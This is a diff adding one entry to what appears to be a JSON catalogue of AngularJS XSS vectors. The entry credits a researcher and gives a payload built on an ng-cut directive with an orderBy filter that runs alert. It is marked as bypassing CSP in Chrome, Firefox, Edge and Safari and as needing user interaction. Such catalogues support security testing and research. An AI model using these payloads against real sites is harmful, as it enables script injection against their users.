@@ -448,5 +448,26 @@
         "hash": "#f",
         "type": "reflected",
         "csp": true
+    },
+    {
+        "versionRange": "All versions (Chrome) shorter",
+        "version": "1.4.5",
+        "authors": [
+            {
+                "name": "Savan Gadhiya",
+                "company": "NotSoSecure",
+                "twitterUrl": "https:\/\/twitter.com\/gadhiyasavan"
+            }
+        ],
+        "vector": "<input ng-cut=$event.path|orderBy:'(y=alert)(1)'>",
+        "type": "reflected",
+        "csp": true,
+        "browsers": [
+                    "chrome",
+                    "firefox",
+                    "edge",
+                    "safari"
+        ],
+        "interaction": true
     }
 ]
